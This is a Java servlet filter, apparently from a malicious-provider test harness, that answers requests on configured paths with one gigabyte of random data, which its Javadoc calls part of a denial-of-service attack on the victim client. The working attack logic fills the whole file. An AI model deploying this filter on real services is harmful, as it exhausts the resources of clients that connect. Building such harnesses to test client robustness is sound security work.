package org.mitre;

import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Part of a denial-of-service attack that writes a large amount of random data to the victim client.
 * <p>
 * Takes init-param 'paths' containing single or comma-separated list of paths for which to perform the attack.
 *
 * @author amar
 *
 */
public class DosFilter implements Filter {

    private static final Logger LOGGER = LoggerFactory.getLogger(DosFilter.class);

    private static final Random RANDOM = new Random();

    private static final int ONE_GIGABYTE = 1 << 30;

    private static final String INIT_PARAM_NAME = "paths";

    private final List<String> paths = new ArrayList<>();

    @Override
    public void init(final FilterConfig filterConfig) throws ServletException {
        final String paths = filterConfig.getInitParameter(INIT_PARAM_NAME);
        if (paths != null) {
            this.paths.addAll(Arrays.asList(paths.split(",")));
        }
        LOGGER.debug("Initialized with paths {}", this.paths);
    }

    @Override
    public void doFilter(final ServletRequest request, final ServletResponse response, final FilterChain chain)
            throws IOException, ServletException {

        final HttpServletRequest httpRequest = (HttpServletRequest) request;
        final String path = requestUriWithoutContext(httpRequest);

        LOGGER.debug("In DOS filter: {}", path);

        if (this.paths.contains(path)) {
            writeRandomData(response, ONE_GIGABYTE);
        } else {
            chain.doFilter(request, response);
        }
    }

    @Override
    public void destroy() {
    }

    /**
     * Writes given number of bytes of random data to the response.
     *
     * @param response The {@link ServletResponse}
     * @param bytes The number of bytes to write
     * @throws IOException If an I/O error occurs
     */
    private void writeRandomData(final ServletResponse response, final int bytes) throws IOException {

        final HttpServletResponse httpResponse = (HttpServletResponse) response;
        final OutputStream os = httpResponse.getOutputStream();

        LOGGER.info("Writing {} bytes of random data...", bytes);

        for (int i = 0; i < bytes; i++) {
            os.write(RANDOM.nextInt());
        }
    }

    /**
     * Returns request URI with context path removed. For example:
     *
     * <pre>
     * &#47;malicious-op&#47;register -> &#47;register
     * </pre>
     *
     * @param request The {@link HttpServletRequest}
     * @return Request URI with context path removed
     */
    private String requestUriWithoutContext(final HttpServletRequest request) {
        return request.getRequestURI().substring(request.getContextPath().length());
    }
}